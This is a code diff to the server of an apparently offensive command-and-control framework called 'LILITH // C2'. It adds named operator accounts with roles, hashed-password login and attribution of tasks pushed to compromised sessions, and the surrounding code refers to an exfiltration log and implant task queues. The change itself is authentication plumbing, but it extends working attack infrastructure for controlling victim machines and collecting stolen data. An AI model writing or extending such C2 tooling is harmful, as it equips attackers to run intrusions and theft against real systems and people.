@@ -78,26 +78,44 @@ _EXFIL_LOG: list[tuple[str, str, str]] = []
 _START_TIME  = time.time()
 _SERVER_BASE = "https://localhost:8443"   # overwritten by start_server
 
-# ── Web UI auth ──────────────────────────────────────────────────────────────
-_UI_TOKENS: set[str] = set()   # empty → auth disabled; supports multiple operator tokens
-_UI_SESSIONS: dict   = {}      # cookie_val → expiry datetime
+# ── Multi-operator auth ───────────────────────────────────────────────────────
+# _OPERATORS: {username: {hash: str, role: "admin"|"operator", created_at: str}}
+# role "admin" can create/delete operators; "operator" can only use the C2
+_OPERATORS: dict = {}
+_UI_TOKENS: set[str] = set()   # legacy single-token compat (auto-creates "admin" operator)
+_UI_SESSIONS: dict   = {}      # cookie_val → {username, expiry, role}
 _UI_SESS_TTL = 28800           # 8h
 
+def _op_hash(password: str) -> str:
+    return hashlib.pbkdf2_hmac("sha256", password.encode(), b"lilith-op-salt", 200_000).hex()
+
 def set_ui_token(token: str) -> None:
+    """Legacy compat: creates/updates the 'admin' operator with this token as password."""
     t = token.strip()
     if t:
         _UI_TOKENS.add(t)
+        _OPERATORS["admin"] = {"hash": _op_hash(t), "role": "admin",
+                               "created_at": datetime.now().isoformat(timespec="seconds")}
+
+def add_operator(username: str, password: str, role: str = "operator") -> None:
+    _OPERATORS[username.strip()] = {"hash": _op_hash(password), "role": role,
+                                    "created_at": datetime.now().isoformat(timespec="seconds")}
 
 def _ui_auth_ok(headers) -> bool:
-    if not _UI_TOKENS:
+    """Returns True if the request carries a valid session cookie."""
+    if not _OPERATORS:
         return True
+    return bool(_get_operator(headers))
+
+def _get_operator(headers) -> dict | None:
+    """Returns {username, role} if session cookie is valid, else None."""
     for part in headers.get("Cookie", "").split(";"):
         k, _, v = part.strip().partition("=")
         if k.strip() == "lilith_sess":
-            exp = _UI_SESSIONS.get(v.strip())
-            if exp and exp > datetime.now():
-                return True
-    return False
+            sess = _UI_SESSIONS.get(v.strip())
+            if sess and sess["expiry"] > datetime.now():
+                return {"username": sess["username"], "role": sess["role"]}
+    return None
 
 _LOGIN_HTML_TPL = (
     '<!doctype html><html><head><meta charset="utf-8"><title>LILITH // AUTH</title>'
@@ -122,7 +140,8 @@ _LOGIN_HTML_TPL = (
     '<div class="logo">LILITH <span>// C2</span></div>'
     '<div class="sub">OPERATOR AUTHENTICATION</div>'
     '{err}'
-    '<input type="password" name="password" placeholder="operator token" autofocus>'
+    '<input type="text" name="username" placeholder="username" autofocus autocomplete="username">'
+    '<input type="password" name="password" placeholder="password" autocomplete="current-password">'
     '<button type="submit">AUTHENTICATE</button>'
     '</form></body></html>'
 )
@@ -195,13 +214,15 @@ def restore_c2_sessions_from_db(db) -> int:
     return count
 
 
-def _c2_push_task(session_id: str, command: str) -> str | None:
+def _c2_push_task(session_id: str, command: str, operator: str = "") -> str | None:
     with _C2_LOCK:
         sess = _C2_SESSIONS.get(session_id)
         if not sess:
             return None
         task_id = secrets.token_hex(8)   # 16-char hex
         sess["tasks"].append((task_id, command))
+        # Store operator attribution alongside task history
+        sess.setdefault("task_ops", {})[task_id] = operator or "unknown"
     return task_id
 
 
@@ -385,7 +406,7 @@ class _Handler(http.server.BaseHTTPRequestHandler):
                 self.end_headers()
                 self.wfile.write(body)
                 return
-            status, ct, resp = _handle_ui("GET", self.path, b"", db)
+            status, ct, resp = _handle_ui("GET", self.path, b"", db, self.headers)
             self.send_response(status)
             self.send_header("Content-Type", ct)
             self.send_header("Content-Length", str(len(resp)))
@@ -459,7 +480,7 @@ class _Handler(http.server.BaseHTTPRequestHandler):
                 self.end_headers()
                 self.wfile.write(body)
                 return
-            status, ct, resp = _handle_ui("POST", raw_path, body_raw, db)
+            status, ct, resp = _handle_ui("POST", raw_path, body_raw, db, self.headers)
             self.send_response(status)
             self.send_header("Content-Type", ct)
             self.send_header("Content-Length", str(len(resp)))
@@ -531,7 +552,7 @@ class _Handler(http.server.BaseHTTPRequestHandler):
                 self.end_headers()
                 self.wfile.write(body)
                 return
-            status, ct, resp = _handle_ui("DELETE", raw_path, b"", db)
+            status, ct, resp = _handle_ui("DELETE", raw_path, b"", db, self.headers)
             self.send_response(status)
             self.send_header("Content-Type", ct)
             self.send_header("Content-Length", str(len(resp)))
@@ -543,12 +564,23 @@ class _Handler(http.server.BaseHTTPRequestHandler):
     def _handle_ui_login(self, body: bytes):
         import urllib.parse
         try:
-            pw = dict(urllib.parse.parse_qsl(body.decode())).get("password", "").strip()
+            fields = dict(urllib.parse.parse_qsl(body.decode()))
+            username = fields.get("username", "").strip()
+            pw       = fields.get("password", "").strip()
         except Exception:
-            pw = ""
-        if _UI_TOKENS and pw in _UI_TOKENS:
+            username = pw = ""
+
+        op = _OPERATORS.get(username)
+        # Legacy compat: if no named operators, fall back to token set
+        if not _OPERATORS and pw in _UI_TOKENS:
+            op = {"hash": _op_hash(pw), "role": "admin"}
+            username = "admin"
+
+        ok = op and secrets.compare_digest(op["hash"], _op_hash(pw))
+        if ok:
             tok = secrets.token_urlsafe(32)
-            _UI_SESSIONS[tok] = datetime.now() + timedelta(seconds=_UI_SESS_TTL)
+            _UI_SESSIONS[tok] = {"username": username, "role": op["role"],
+                                 "expiry": datetime.now() + timedelta(seconds=_UI_SESS_TTL)}
             self.send_response(302)
             self.send_header("Set-Cookie",
                 f"lilith_sess={tok}; HttpOnly; SameSite=Strict; Path=/; Max-Age={_UI_SESS_TTL}")
